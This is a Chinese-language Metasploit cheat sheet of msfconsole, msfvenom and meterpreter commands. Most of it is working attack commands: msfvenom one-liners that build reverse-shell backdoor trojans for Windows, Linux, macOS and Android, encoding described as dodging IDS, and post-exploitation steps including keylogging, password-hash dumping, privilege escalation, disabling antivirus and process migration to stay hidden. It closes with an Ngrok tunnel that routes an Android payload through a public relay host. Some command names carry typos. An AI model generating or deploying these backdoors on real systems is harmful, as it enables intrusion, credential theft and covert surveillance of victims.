[TOC]



# msfconsole和msfvenom

| msfconsole基本命令                                           |                                                      |
| :----------------------------------------------------------- | ---------------------------------------------------- |
| show exploits                                                | 查看所有可用的的渗透攻击程序代码                     |
| show auxiliary                                               | 查看所有可用的辅助攻击工具                           |
| show options                                                 | 查看模块所有可用选项                                 |
| show payloads                                                | 查看改模块适用的所有载荷代码                         |
| show targets                                                 | 查看该模块适用的攻击目标类型                         |
|                                                              |                                                      |
| **使用命令**                                                 |                                                      |
| search                                                       | 根据关键字搜索某模块                                 |
| info                                                         | 显示模块的详细信息                                   |
| use                                                          | 进入使用某渗透攻击模块                               |
| back                                                         | 回退                                                 |
| set/unset                                                    | 设置/禁用模块中的某个参数                            |
| save                                                         | 将当前值保存下来，以便下次启动msf终端时仍可使用      |
|                                                              |                                                      |
| **msfvenom主要参数**                                         |                                                      |
| -p                                                           | payload,                                             |
| -e                                                           | 编码方式                                             |
| -i                                                           | 编码次数                                             |
| -b                                                           | 在生成的程序中避免出现的值                           |
| LHOST,LPORT                                                  | 监听上线的主机IP和端口                               |
| -f exe/apk/elf/macoh                                         | 生成exe文件 apk文件 elf文件 macoh                    |
| msfvenom -l payloads                                         | 列出所有的payload                                    |
| msfvenom -p windows/x64/meterpreter/revers_tcp -e x86/shikate_ga_nai -i 5 -b '\x00' LHOST=IP地址 LPORT=端口 -f exe > test.exe | 生成exe格式后门木马并用shikata_ga_nai编码绕过IDS检测 |
|                                                              |                                                      |
| **不同操作系统的后门生成方式**                               |                                                      |
| msfvenom -p linux/x86/meterptetert/reverse_tcp LHOST=IP LPORT=端口 -f elf > shell.elf | 生成linux后门木马                                    |
| msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=端口 -f exe > shell.exe | 生成windows后门木马                                  |
| msfvenom-p osx/x86/shell_reverse_tcp LHOST=IP LPORT=端口 -f macho > shell.macho | 生成mac后门木马                                      |
| msfvenom -p android/meterpretert/reverse_tcp LHOST=IP LPORT=端口 -o shell.apk | 生成android后门木马程序                              |
|                                                              |                                                      |
|                                                              |                                                      |
|                                                              |                                                      |
|                                                              |                                                      |
|                                                              |                                                      |
|                                                              |                                                      |
|                                                              |                                                      |
|                                                              |                                                      |
|                                                              |                                                      |
|                                                              |                                                      |

# meterpreter渗透命令

| 常用命令                                 |                              |
| ---------------------------------------- | ---------------------------- |
| background                               | 放回后台                     |
| sessions -l                              | 查看后台回话                 |
| sessions 会话ID                          | 进入会话                     |
| exit                                     | 关闭会话                     |
| help                                     | 帮助信息                     |
| sysinfo                                  | 系统平台信息                 |
| migrate pid                              | 迁移进程                     |
| getlwd                                   | 查看攻击机目录               |
| getwd                                    | 查看靶机目录                 |
| lcd                                      | 切换攻击机目录               |
| ls                                       | 查看靶机目录列表文件         |
| cd                                       | 进入指定目录                 |
| rm                                       | 删除文件                     |
| download                                 | 下载文件                     |
| upload                                   | 上传文件                     |
| execute -f cmd.exe -i                    | 执行程序,不安全靶机会打开cmd |
| shell                                    | 命令行cmd                    |
| ps                                       | 查看进程                     |
| run post/windows/capture/keylog_recorder | 键盘记录                     |
| getuid                                   | 查看当前用户权限             |
| use priv                                 | 加载权限模块                 |
| getsystem                                | 提升到system权限             |
| hashdump                                 | 导出密码散列                 |
| run killav                               | 关闭杀毒软件                 |
| screenshot                               | 屏幕截图                     |
| run vnc                                  | 视屏功能动态查看靶机电脑动向 |

# 示例

| **使用**                                                     |                                                    |
| ------------------------------------------------------------ | -------------------------------------------------- |
| msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe > shell.exe | 生成木马文件，放到靶机上                           |
| msfconsole                                                   | 打开msf                                            |
| use exploit/multi/handler                                    | 使用模块                                           |
| set payload windows/x64/meterpreter/reverse_tcp              | 设置payload                                        |
| show options                                                 | 查看需要配置的信息                                 |
| set LSHOST                                                   | 设置监听端IP                                       |
| sysinfo                                                      | 查看监听机器信息                                   |
| exploit                                                      | 开始监听                                           |
|                                                              |                                                    |
| **成功监听后shell命令**                                      |                                                    |
| background                                                   | 保存监听会话，这样可以使用其他的模块对靶机进行攻击 |
| sessions -l (1)                                              | 列出保存的会话，回到会话输入序号即可，如1          |
| sysinfo                                                      | 查看靶机的信息，操作系统版本等                     |
| ps                                                           | 查看进程                                           |
| migrate 2840(explorer.exe桌面进程)                           | 牵引进程，不容易别杀毒软件发现                     |
| getlwd                                                       | 查看攻击机的目录                                   |
| getwd                                                        | 查看靶机的目录                                     |
| ls                                                           | 查看靶机当前目录下的文件                           |
| shell                                                        | 到靶机的cmd下                                      |
| 在shell下使用命令创建文件echo test123123 > test.txt          | 在目录下创建一个test.txt 内容为test123123          |
| download test.txt /root/kali                                 | 下载到攻击机的root目录                             |

# 主动攻击

| windows蓝屏 |      |
| ----------- | ---- |
|             |      |
|             |      |
|             |      |
|             |      |
|             |      |
|             |      |
|             |      |
|             |      |
|             |      |

内网穿透Ngrok

使用msf内网穿透需要注册tcp

打开Ngrok客户端，到Ngrok文件下，运行./sunny clientid 隧道ID

生成apk文件 

msfvenom -p andriod/meterpreter/reverse_tcp LHOST=free.idcfengye.com LPORT=10089 -o shell.apk 或者R > shell.apk

msfconsole

use exploit/multi/handler

set payload android/meterpreter/reverse_tcp

set LHOST=本地ip

set LPORT=设置在Nrgok上的端口

exploit开始监听

